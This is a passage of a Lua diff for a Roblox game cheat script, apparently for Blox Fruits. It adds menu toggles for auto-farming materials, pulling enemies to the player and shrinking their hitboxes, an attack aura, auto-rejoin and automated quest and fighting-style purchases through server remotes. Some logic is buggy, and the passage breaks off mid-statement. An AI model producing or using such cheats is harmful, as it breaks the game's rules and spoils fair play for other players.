+elseif World2 then
+    MaterialList = {"Radioactive", "Mystic Droplet", "Magma Ore", "Leather", "Ectoplasm", "Scrap Metal"};
+elseif World3 then
+    MaterialList = {"Leather", "Scrap Metal", "Conjured Cocoa", "Dragon Scale", "Gunpowder", "Fish Tail", "Mini Tusk"};
+end
+function getConfigMaterial(Material)
+    if Material == "Radioactive" and World2 then
+        MaterialMon = {"Factory Staff"};
+        MaterialPos = CFrame.new(-507.7895202636719, 72.99479675292969, -126.45632934570312);
+    elseif Material == "Mystic Droplet" and World2 then
+        MaterialMon = {"Water Fighter"};
+        MaterialPos = CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875);
+    elseif Material == "Magma Ore" and World1 then
+        MaterialMon = {"Military Spy"};
+        MaterialPos = CFrame.new(-5850.2802734375, 77.28675079345703, 8848.6748046875);
+    elseif Material == "Magma Ore" and World2 then
+        MaterialMon = {"Lava Pirate"};
+        MaterialPos = CFrame.new(-5234.60595703125, 51.953372955322266, -4732.27880859375);
+    elseif Material == "Angel Wings" and World1 then
+        MaterialMon = {"Royal Soldier"};
+        MaterialPos = CFrame.new(-7827.15625, 5606.912109375, -1705.5833740234375);
+    elseif Material == "Leather" and World1 then
+        MaterialMon = {"Pirate"};
+        MaterialPos = CFrame.new(-1211.8792724609375, 4.787090301513672, 3916.83056640625);
+    elseif Material == "Leather" and World2 then
+        MaterialMon = {"Marine Captain"};
+        MaterialPos = CFrame.new(-2010.5059814453125, 73.00115966796875, -3326.620849609375);
+    elseif Material == "Leather" and World3 then
+        MaterialMon = {"Jungle Pirate"};
+        MaterialPos = CFrame.new(-11975.78515625, 331.7734069824219, -10620.0302734375);
+    elseif Material == "Ectoplasm" and World2 then
+        MaterialMon = {"Ship Deckhand", "Ship Engineer", "Ship Steward", "Ship Officer"};
+        MaterialPos = CFrame.new(911.35827636719, 125.95812988281, 33159.5390625);
+    elseif Material == "Scrap Metal" and World1 then
+        MaterialMon = {"Brute"};
+        MaterialPos = CFrame.new(-1132.4202880859375, 14.844913482666016, 4293.30517578125);
+    elseif Material == "Scrap Metal" and World2 then
+        MaterialMon = {"Mercenary"};
+        MaterialPos = CFrame.new(-972.307373046875, 73.04473876953125, 1419.2901611328125);
+    elseif Material == "Scrap Metal" and World3 then
+        MaterialMon = {"Pirate Millionaire"};
+        MaterialPos = CFrame.new(-289.6311950683594, 43.8282470703125, 5583.66357421875);
+    elseif Material == "Conjured Cocoa" and World3 then
+        MaterialMon = {"Chocolate Bar Battler"};
+        MaterialPos = CFrame.new(744.7930908203125, 24.76934242248535, -12637.7255859375);
+    elseif Material == "Dragon Scale" and World3 then
+        MaterialMon = {"Dragon Crew Warrior"};
+        MaterialPos = CFrame.new(5824.06982421875, 51.38640213012695, -1106.694580078125);
+    elseif Material == "Gunpowder" and World3 then
+        MaterialMon = {"Pistol Billionaire"};
+        MaterialPos = CFrame.new(-379.6134338378906, 73.84449768066406, 5928.5263671875);
+    elseif Material == "Fish Tail" and World3 then
+        MaterialMon = {"Fishman Captain"};
+        MaterialPos = CFrame.new(-10961.0126953125, 331.7977600097656, -8914.29296875);
+    elseif Material == "Mini Tusk" and World3 then
+        MaterialMon = {"Mithological Pirate"};
+        MaterialPos = CFrame.new(-13516.0458984375, 469.8182373046875, -6899.16064453125);
+    end
+end
+MaterialDropdown = Tabs.OthersTab:Dropdown({
+    Title = "Choose Material",
+    Values = MaterialList,
+    Value = _G.Settings.Farm["Selected Material"],
+    Callback = function(option)
+        _G.Settings.Farm["Selected Material"] = option;
+    end
+});
+AutoFarmMaterialToggle = Tabs.OthersTab:Toggle({
+    Title = "Auto Farm Material",
+    Value = _G.Settings.Farm["Auto Farm Material"],
+    Callback = function(state)
+        _G.Settings.Farm["Auto Farm Material"] = state;
+        StopTween(_G.Settings.Farm["Auto Farm Material"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Farm["Auto Farm Material"] then
+            pcall(function()
+                getConfigMaterial(_G.Settings.Farm["Selected Material"]);
+                for i, mon in pairs(MaterialMon) do
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild(mon) then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v.Name == mon then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        PosMon = v.HumanoidRootPart.CFrame;
+                                        MonFarm = v.Name;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        Attack();
+                                    until not _G.Settings.Farm["Auto Farm Material"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    else
+                        UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                        local Distance = (Vector3.new(MaterialPos) -
+                                             (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart
+                                                 .Position).Magnitude;
+                        if Distance > 18000 and _G.Settings.Farm["Selected Material"] == "Ectoplasm" then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance",
+                                Vector3.new(923.21252441406, 126.9760055542, 32852.83203125));
+                        end
+                        TweenPlayer(MaterialPos);
+                    end
+                end
+            end);
+        end
+    end
+end);
+SettingsSection = Tabs.SettingsTab:Section({
+    Title = "Settings",
+    TextXAlignment = "Left"
+});
+SpinPositionToggle = Tabs.SettingsTab:Toggle({
+    Title = "Spin Position",
+    Desc = "Spin Position When Farm",
+    Value = _G.Settings.Setting["Spin Position"],
+    Callback = function(state)
+        _G.Settings.Setting["Spin Position"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+FarmDistanceSlider = Tabs.SettingsTab:Slider({
+    Title = "Farm Distance",
+    Step = 1,
+    Value = {
+        Min = 10,
+        Max = 50,
+        Default = _G.Settings.Setting["Farm Distance"]
+    },
+    Callback = function(value)
+        _G.Settings.Setting["Farm Distance"] = value;
+    end
+});
+PlayerTweenSpeedSlider = Tabs.SettingsTab:Slider({
+    Title = "Player Tween Speed",
+    Step = 1,
+    Value = {
+        Min = 10,
+        Max = 350,
+        Default = _G.Settings.Setting["Player Tween Speed"]
+    },
+    Callback = function(value)
+        _G.Settings.Setting["Player Tween Speed"] = value;
+    end
+});
+BringMobToggle = Tabs.SettingsTab:Toggle({
+    Title = "Bring Mob",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.Setting["Bring Mob"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while task.wait() do
+        if _G.Settings.Setting["Bring Mob"] then
+            pcall(function()
+                for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+                    if not string.find(v.Name, "Boss") and v.Name == MonFarm and
+                        (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                        BringMobDistance then
+                        v.HumanoidRootPart.CFrame = PosMon;
+                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                    end
+                end
+            end);
+        end
+    end
+end);
+local BringList = {"Low", "Normal", "High"};
+BringMobDropdown = Tabs.SettingsTab:Dropdown({
+    Title = "Bring Mob",
+    Value = _G.Settings.Setting["Bring Mob Mode"],
+    Values = BringList,
+    Callback = function(option)
+        _G.Settings.Setting["Bring Mob Mode"] = option;
+    end
+});
+local AttackList = {"Slow", "Normal", "Fast", "Super Fast"};
+FastAttackMethodDropdown = Tabs.SettingsTab:Dropdown({
+    Title = "Fast Attack Method",
+    Value = _G.Settings.Setting["Fast Attack Mode"],
+    Values = AttackList,
+    Callback = function(option)
+        _G.Settings.Setting["Fast Attack Mode"] = option;
+    end
+});
+spawn(function()
+    while wait() do
+        if _G.Settings.Setting["Fast Attack Mode"] == "Slow" then
+            _G.Settings.Setting["Fast Attack Delay"] = 0.32;
+        elseif _G.Settings.Setting["Fast Attack Mode"] == "Normal" then
+            _G.Settings.Setting["Fast Attack Delay"] = 0.22;
+        elseif _G.Settings.Setting["Fast Attack Mode"] == "Fast" then
+            _G.Settings.Setting["Fast Attack Delay"] = 0.17;
+        elseif _G.Settings.Setting["Fast Attack Mode"] == "Super Fast" then
+            _G.Settings.Setting["Fast Attack Delay"] = 0.12;
+        end
+    end
+end);
+spawn(function()
+    while wait() do
+        if _G.Settings.Setting["Bring Mob"] then
+            pcall(function()
+                if _G.Settings.Setting["Bring Mob Mode"] == "Low" then
+                    BringMobDistance = 150;
+                elseif _G.Settings.Setting["Bring Mob Mode"] == "Normal" then
+                    BringMobDistance = 250;
+                elseif _G.Settings.Setting["Bring Mob Mode"] == "High" then
+                    BringMobDistance = 800;
+                end
+            end);
+        end
+    end
+end);
+AttackAuraToggle = Tabs.SettingsTab:Toggle({
+    Title = "Atatck Aura",
+    Desc = "Attack Nearest Enemies",
+    Value = _G.Settings.Items["Attack Aura"],
+    Callback = function(state)
+        _G.Settings.Items["Attack Aura"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    (game:GetService("RunService")).RenderStepped:Connect(function()
+        if _G.Settings.Setting["Attack Aura"] and (not _G.Settings.Main["Auto Farm Fruit Mastery"]) and
+            (not _G.Settings.Main["Auto Farm Gun Mastery"]) then
+            pcall(function()
+                Attack();
+            end);
+        end
+    end);
+end);
+GraphicSettingSection = Tabs.SettingsTab:Section({
+    Title = "Graphic",
+    TextXAlignment = "Left"
+});
+HideNotificationToggle = Tabs.SettingsTab:Toggle({
+    Title = "Hide Notification",
+    Value = _G.Settings.Setting["Hide Notification"],
+    Callback = function(state)
+        _G.Settings.Setting["Hide Notification"] = state;
+        StopTween(_G.Settings.Setting["Hide Notification"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["Hide Notification"] then
+            game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = false;
+        else
+            game.Players.LocalPlayer.PlayerGui.Notifications.Enabled = true;
+        end
+    end
+end);
+HideDamageTextToggle = Tabs.SettingsTab:Toggle({
+    Title = "Hide Damage Text",
+    Value = _G.Settings.Setting["Hide Damage Text"],
+    Callback = function(state)
+        _G.Settings.Setting["Hide Damage Text"] = state;
+        StopTween(_G.Settings.Setting["Hide Damage Text"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["Hide Damage Text"] then
+            (game:GetService("ReplicatedStorage")).Assets.GUI.DamageCounter.Enabled = false;
+        else
+            (game:GetService("ReplicatedStorage")).Assets.GUI.DamageCounter.Enabled = true;
+        end
+    end
+end);
+BlackScreenToggle = Tabs.SettingsTab:Toggle({
+    Title = "Black Screen",
+    Value = _G.Settings.Setting["Black Screen"],
+    Callback = function(state)
+        _G.Settings.Setting["Black Screen"] = state;
+        StopTween(_G.Settings.Setting["Black Screen"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["Black Screen"] then
+            (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Blackscreen.Size = UDim2.new(500, 0, 500, 500);
+        else
+            (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Blackscreen.Size = UDim2.new(1, 0, 500, 500);
+        end
+    end
+end);
+WhiteScreenToggle = Tabs.SettingsTab:Toggle({
+    Title = "White Screen",
+    Value = _G.Settings.Setting["White Screen"],
+    Callback = function(state)
+        _G.Settings.Setting["White Screen"] = state;
+        StopTween(_G.Settings.Setting["White Screen"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["White Screen"] then
+            (game:GetService("RunService")):Set3dRenderingEnabled(false);
+        else
+            (game:GetService("RunService")):Set3dRenderingEnabled(true);
+        end
+    end
+end);
+MasterySettingsSection = Tabs.SettingsTab:Section({
+    Title = "Mastery Settings",
+    TextXAlignment = "Left"
+});
+MasteryHealthSlider = Tabs.SettingsTab:Slider({
+    Title = "Mastery Health %",
+    Step = 1,
+    Value = {
+        Min = 1,
+        Max = 100,
+        Default = _G.Settings.Setting["Mastery Health"]
+    },
+    Callback = function(value)
+        _G.Settings.Setting["Mastery Health"] = value;
+    end
+});
+DevilFruitParagraph = Tabs.SettingsTab:Paragraph({
+    Title = "Devil Fruit Skill"
+});
+MasteryFruitSkillZToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill Z",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.Setting["Fruit Mastery Skill Z"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MasteryFruitSkillXToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill X",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.Setting["Fruit Mastery Skill X"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MasteryFruitSkillCToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill C",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.Setting["Fruit Mastery Skill C"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MasteryFruitSkillVToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill V",
+    Value = _G.Settings.Setting["Fruit Mastery Skill V"],
+    Callback = function(state)
+        _G.Settings.Setting["Fruit Mastery Skill V"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MasteryFruitSkillFToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill F",
+    Value = _G.Settings.Setting["Fruit Mastery Skill F"],
+    Callback = function(state)
+        _G.Settings.Setting["Fruit Mastery Skill F"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+GunSkillParagraph = Tabs.SettingsTab:Paragraph({
+    Title = "Gun Skill"
+});
+MasteryGunSkillZToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill Z",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.Setting["Gun Mastery Skill Z"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+MasteryGunSkillXToggle = Tabs.SettingsTab:Toggle({
+    Title = "Skill X",
+    Value = true,
+    Callback = function(state)
+        _G.Settings.Setting["Gun Mastery Skill X"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+OthersSettingsSection = Tabs.SettingsTab:Section({
+    Title = "Others",
+    TextXAlignment = "Left"
+});
+AutoSetSpawnPointToggle = Tabs.SettingsTab:Toggle({
+    Title = "Auto Set Spawn Point",
+    Value = _G.Settings.Setting["Auto Set Spawn Point"],
+    Callback = function(state)
+        _G.Settings.Setting["Auto Set Spawn Point"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait() do
+        if _G.Settings.Setting["Auto Set Spawn Point"] then
+            pcall(function()
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetSpawnPoint");
+            end);
+        end
+    end
+end);
+AutoObservationToggle = Tabs.SettingsTab:Toggle({
+    Title = "Auto Observation",
+    Value = _G.Settings.Setting["Auto Observation"],
+    Callback = function(state)
+        _G.Settings.Setting["Auto Observation"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["Auto Observation"] then
+            if not (game:GetService("Players")).LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") then
+                (game:GetService("VirtualUser")):CaptureController();
+                (game:GetService("VirtualUser")):SetKeyDown("0x65");
+                wait();
+                (game:GetService("VirtualUser")):SetKeyUp("0x65");
+            end
+        end
+    end
+end);
+AutoHakiToggle = Tabs.SettingsTab:Toggle({
+    Title = "Auto Haki",
+    Value = _G.Settings.Setting["Auto Haki"],
+    Callback = function(state)
+        _G.Settings.Setting["Auto Haki"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoRejoinToggle = Tabs.SettingsTab:Toggle({
+    Title = "Auto Rejoin",
+    Value = _G.Settings.Setting["Auto Rejoin"],
+    Callback = function(state)
+        _G.Settings.Setting["Auto Rejoin"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["Auto Rejoin"] then
+            game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(v)
+                if v.Name == "ErrorPrompt" and v:FindFirstChild("MessageArea") and
+                    v.MessageArea:FindFirstChild("ErrorFrame") then
+                    (game:GetService("TeleportService")):Teleport(game.PlaceId);
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Setting["Auto Haki"] then
+            if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Buso");
+            end
+        end
+    end
+end);
+GunSwordSection = Tabs.ItemsTab:Section({
+    Title = "World",
+    TextXAlignment = "Left"
+});
+AutoSecondSeaToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Second Sea",
+    Desc = "Function Sea 1 Only",
+    Value = _G.Settings.Items["Auto Second Sea"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Second Sea"] = state;
+        StopTween(_G.Settings.Items["Auto Second Sea"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoThirdSeaToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Third Sea",
+    Desc = "Function Sea 2 Only",
+    Value = _G.Settings.Items["Auto Third Sea"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Third Sea"] = state;
+        StopTween(_G.Settings.Items["Auto Third Sea"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Third Sea"] then
+            pcall(function()
+                if (game:GetService("Players")).LocalPlayer.Data.Level.Value >= 1500 and World2 then
+                    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ZQuestProgress", "General") ==
+                        0 then
+                        TweenPlayer(CFrame.new(-1926.3221435547, 12.819851875305, 1738.3092041016));
+                        if ((CFrame.new((-1926.3221435547), 12.819851875305, 1738.3092041016)).Position -
+                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                            10 then
+                            wait(1.5);
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin");
+                        end
+                        wait(1.8);
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra") then
+                            for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                                if v.Name == "rip_indra" then
+                                    OldCFrameThird = v.HumanoidRootPart.CFrame;
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        v.HumanoidRootPart.CFrame = OldCFrameThird;
+                                        v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        v.Humanoid.WalkSpeed = 0;
+                                        Attack();
+                                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelZou");
+                                    until _G.Settings.Items["Auto Third Sea"] == false or v.Humanoid.Health <= 0 or
+                                        (not v.Parent);
+                                end
+                            end
+                        elseif not (game:GetService("Workspace")).Enemies:FindFirstChild("rip_indra") and
+                            ((CFrame.new((-26880.93359375), 22.848554611206, 473.18951416016)).Position -
+                                (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                            1000 then
+                            TweenPlayer(CFrame.new(-26880.93359375, 22.848554611206, 473.18951416016));
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Items["Auto Second Sea"] and World1 then
+            pcall(function()
+                local MyLevel = (game:GetService("Players")).LocalPlayer.Data.Level.Value;
+                if MyLevel >= 700 and World1 then
+                    if (game:GetService("Workspace")).Map.Ice.Door.CanCollide == false and
+                        (game:GetService("Workspace")).Map.Ice.Door.Transparency == 1 then
+                        local CFrame1 = CFrame.new(4849.29883, 5.65138149, 719.611877);
+                        repeat
+                            TweenPlayer(CFrame1);
+                            wait();
+                        until (CFrame1.Position -
+                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or
+                            _G.Settings.Items["Auto Second Sea"] == false;
+                        wait(1.1);
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("DressrosaQuestProgress",
+                            "Detective");
+                        wait(0.5);
+                        EquipWeapon("Key");
+                        repeat
+                            TweenPlayer(CFrame.new(1347.7124, 37.3751602, -1325.6488));
+                            wait();
+                        until (Vector3.new(1347.7124, 37.3751602, (-1325.6488)) -
+                            (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or
+                            _G.Settings.Items["Auto Second Sea"] == false;
+                        wait(0.5);
+                    elseif (game:GetService("Workspace")).Map.Ice.Door.CanCollide == false and
+                        (game:GetService("Workspace")).Map.Ice.Door.Transparency == 1 then
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("Ice Admiral") then
+                            for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                                if v.Name == "Ice Admiral" then
+                                    if not v.Humanoid.Health <= 0 then
+                                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                            v.Humanoid.Health > 0 then
+                                            OldCFrameSecond = v.HumanoidRootPart.CFrame;
+                                            repeat
+                                                (game:GetService("RunService")).Heartbeat:wait();
+                                                AutoHaki();
+                                                EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                                v.Humanoid.WalkSpeed = 0;
+                                                v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                                v.HumanoidRootPart.CFrame = OldCFrameSecond;
+                                                TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                                Attack();
+                                            until not _G.Settings.Items["Auto Second Sea"] or (not v.Parent) or
+                                                v.Humanoid.Health <= 0;
+                                        end
+                                    else
+                                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(
+                                            "TravelDressrosa");
+                                    end
+                                end
+                            end
+                        elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Ice Admiral") then
+                            TweenPlayer(
+                                ((game:GetService("ReplicatedStorage")):FindFirstChild("Ice Admiral")).HumanoidRootPart
+                                    .CFrame * CFrame.new(5, 10, 7));
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+GunSwordSection = Tabs.ItemsTab:Section({
+    Title = "Fighting Style",
+    TextXAlignment = "Left"
+});
+AutoSuperHumanToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Super Human",
+    Value = _G.Settings.Items["Auto Super Human"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Super Human"] = state;
+        StopTween(_G.Settings.Items["Auto Super Human"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoDeathStepToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Death Step",
+    Value = _G.Settings.Items["Auto Death Step"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Death Step"] = state;
+        StopTween(_G.Settings.Items["Auto Death Step"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoSharkmanKarateToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Sharkman Karate",
+    Value = _G.Settings.Items["Auto Fishman Karate"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Fishman Karate"] = state;
+        StopTween(_G.Settings.Items["Auto Fishman Karate"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoElectricClawToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Electric Claw",
+    Value = _G.Settings.Items["Auto Electric Claw"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Electric Claw"] = state;
+        StopTween(_G.Settings.Items["Auto Electric Claw"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoDragonTalonToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto Dragon Talon",
+    Value = _G.Settings.Items["Auto Dragon Talon"],
+    Callback = function(state)
+        _G.Settings.Items["Auto Dragon Talon"] = state;
+        StopTween(_G.Settings.Items["Auto Dragon Talon"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoGodHumanToggle = Tabs.ItemsTab:Toggle({
+    Title = "Auto God Human",
+    Value = _G.Settings.Items["Auto God Human"],
+    Callback = function(state)
+        _G.Settings.Items["Auto God Human"] = state;
+        StopTween(_G.Settings.Items["Auto God Human"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while task.wait(0.2) do
+        if _G.Settings.Items["Auto God Human"] then
+            pcall(function()
+                if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Superhuman") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Superhuman") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Black Leg") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Black Leg") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Death Step") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Death Step") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Fishman Karate") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Sharkman Karate") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Sharkman Karate") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electro") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electro") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electric Claw") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electric Claw") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Claw") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Claw") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Talon") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Dragon Talon") or
+                    (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Godhuman") or
+                    (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Godhuman") then
+                    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman", true) == 1 then
+                        if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Superhuman") and
+                            ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Superhuman")).Level.Value >=
+                            400 or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Superhuman") and
+                            ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Superhuman")).Level
+                                .Value >= 400 then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+                        end
+                    else
+                        WindUI:Notify({
+                            Title = "Notification",
+                            Content = "Not Have Superhuman",
+                            Icon = "bell",
+                            Duration = 5
+                        });
+                    end
+                    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep", true) == 1 then
+                        if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Death Step") and
+                            ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Death Step")).Level.Value >=
+                            400 or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Death Step") and
+                            ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Death Step")).Level
+                                .Value >= 400 then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+                        end
+                    else
+                        WindUI:Notify({
+                            Title = "Notification",
+                            Content = "Not Have Death Step",
+                            Icon = "bell",
+                            Duration = 5
+                        });
+                    end
+                    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate", true) ==
+                        1 then
+                        if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Sharkman Karate") and
+                            ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Sharkman Karate")).Level
+                                .Value >= 400 or
+                            (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Sharkman Karate") and
+                            ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Sharkman Karate")).Level
+                                .Value >= 400 then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+                        end
+                    else
+                        WindUI:Notify({
+                            Title = "Notification",
+                            Content = "Not Have Sharkman Karate",
+                            Icon = "bell",
+                            Duration = 5
+                        });
+                    end
+                    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw", true) == 1 then
+                        if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electric Claw") and
+                            ((game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Electric Claw")).Level
+                                .Value >= 400 or
+                            (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electric Claw") and
+                            ((game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Electric Claw")).Level
+                                .Value >= 400 then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+                        end
+                    else
+                        WindUI:Notify({
+                            Title = "Notification",
+                            Content = "Not Have Electric Claw",
+                            Icon = "bell",
+                            Duration = 5
+                        });
+                    end
+                    if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon", true) == 1 then
+                        if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Dragon Talon") and
